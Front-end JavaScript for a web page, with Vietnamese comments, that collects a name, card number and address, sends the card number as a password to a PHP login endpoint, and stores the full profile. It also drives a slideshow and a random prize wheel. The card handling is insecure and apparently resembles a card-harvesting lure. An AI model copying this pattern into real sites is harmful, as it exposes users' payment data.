document.addEventListener('DOMContentLoaded', () => {
    const profileBtn = document.querySelector('.profile-btn');
    const profileInfo = document.querySelector('.profile-info');
    const nameInput = document.getElementById('name');
    const cardInput = document.getElementById('card');
    const addressInput = document.getElementById('address');
    const saveBtn = document.getElementById('save-profile');
    const loginError = document.getElementById('login-error');
    const notification = document.getElementById('notification');
    const menuIcons = document.querySelectorAll('.menu-icon');
    const detailsContainer = document.getElementById('details-container');
    const wheel = document.getElementById('wheel');
    const wheelInner = document.getElementById('wheel-inner');
    const spinBtn = document.querySelector('.spin-btn');

    // Toggle profile info visibility
    function toggleProfileInfo(event) {
        event.preventDefault();
        profileInfo.classList.toggle('active');
    }

    profileBtn.addEventListener('click', toggleProfileInfo);

    // Close form if clicked outside
    document.addEventListener('click', (event) => {
        if (!profileBtn.contains(event.target) && !profileInfo.contains(event.target)) {
            profileInfo.classList.remove('active');
        }
    });

    // Handle save profile (login and store data)
    saveBtn.addEventListener('click', async () => {
        const name = nameInput.value.trim();
        const card = cardInput.value.trim();
        const address = addressInput.value.trim();
        const profile = {
            name: name,
            card: card,
            address: address,
            timestamp: new Date().toLocaleString('en-US', { timeZone: 'Asia/Ho_Chi_Minh' }) // 04:07 PM +07, 12/06/2025
        };

        if (name && card && address) {
            try {
                const loginResponse = await fetch('backend/login.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: name, password: card })
                });
                const loginData = await loginResponse.json();

                if (loginResponse.ok && loginData.success) {
                    const profileResponse = await fetch('backend/profiles.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(profile)
                    });

                    if (profileResponse.ok) {
                        notification.classList.add('active');
                        setTimeout(() => notification.classList.remove('active'), 3000);
                        profileInfo.classList.remove('active');
                        nameInput.value = '';
                        cardInput.value = '';
                        addressInput.value = '';
                    } else {
                        throw new Error('Failed to save profile');
                    }
                } else {
                    loginError.style.display = 'block';
                    loginError.textContent = loginData.message || 'Invalid login credentials!';
                }
            } catch (error) {
                console.error('Error:', error);
                loginError.style.display = 'block';
                loginError.textContent = 'System error. Please try again!';
            }
        } else {
            loginError.style.display = 'block';
            loginError.textContent = 'Please fill in all fields!';
        }
    });

    // New Menu Logic with active state
    function updateMenuState() {
        const scrollPosition = window.scrollY;
        const topBar = document.getElementById('top-bar').offsetTop;
        const slideshow = document.getElementById('slideshow-container').offsetTop;
        const menuSection = document.getElementById('menu-section').offsetTop;

        menuIcons.forEach(icon => {
            icon.classList.remove('active');
            icon.style.filter = 'brightness(0.5) invert(1)';
            icon.style.border = 'none';
        });

        if (scrollPosition < slideshow) {
            menuIcons[0].classList.add('active');
            menuIcons[0].style.filter = 'none';
            menuIcons[0].style.border = '2px solid #ffd700';
        } else if (scrollPosition < menuSection) {
            menuIcons[1].classList.add('active');
            menuIcons[1].style.filter = 'none';
            menuIcons[1].style.border = '2px solid #ffd700';
        } else {
            menuIcons[2].classList.add('active');
            menuIcons[2].style.filter = 'none';
            menuIcons[2].style.border = '2px solid #ffd700';
        }
    }

    menuIcons.forEach(icon => {
        icon.addEventListener('click', () => {
            if (!icon.disabled) {
                const targetId = icon.getAttribute('data-target');
                document.querySelector(targetId).scrollIntoView({ behavior: 'smooth' });
                setTimeout(updateMenuState, 500);
            }
        });
    });

    window.addEventListener('scroll', updateMenuState);
    updateMenuState();

    // Slideshow Logic
    let slideIndex = 0;
    let autoSlideTimeout;

    function showSlides() {
        let slides = document.querySelectorAll(".slide");
        for (let i = 0; i < slides.length; i++) {
            slides[i].classList.remove("active");
        }
        if (slideIndex >= slides.length) slideIndex = 0;
        if (slideIndex < 0) slideIndex = slides.length - 1;
        slides[slideIndex].classList.add("active");
        slideIndex++;
        clearTimeout(autoSlideTimeout);
        autoSlideTimeout = setTimeout(showSlides, 3000);
    }

    window.changeSlide = function(n) {
        slideIndex += n;
        showSlides();
    };

    showSlides();

    // Toggle details
    function toggleDetails() {
        detailsContainer.style.display = detailsContainer.style.display === 'none' ? 'block' : 'none';
    }

    // Wheel Spin Logic
    let spinning = false;

    function spinWheel() {
        if (spinning) return;

        spinning = true;
        spinBtn.disabled = true;
        const randomDegrees = Math.floor(Math.random() * 3600) + 720; // Quay nhiều vòng + ngẫu nhiên
        const prizes = [50, 100, 150, 200, 250, 300, 350, 400]; // Các mức điểm ngẫu nhiên
        const prize = prizes[Math.floor(Math.random() * prizes.length)];

        wheelInner.style.transition = 'none';
        wheelInner.style.transform = 'rotate(0deg)';
        void wheelInner.offsetWidth; // Trigger reflow
        wheelInner.style.transition = `transform 4s ease-out`;
        wheelInner.style.transform = `rotate(${randomDegrees}deg)`;

        setTimeout(() => {
            wheelInner.textContent = prize;
            spinning = false;
            spinBtn.disabled = false;
        }, 4000); // Thời gian quay 4s
    }
});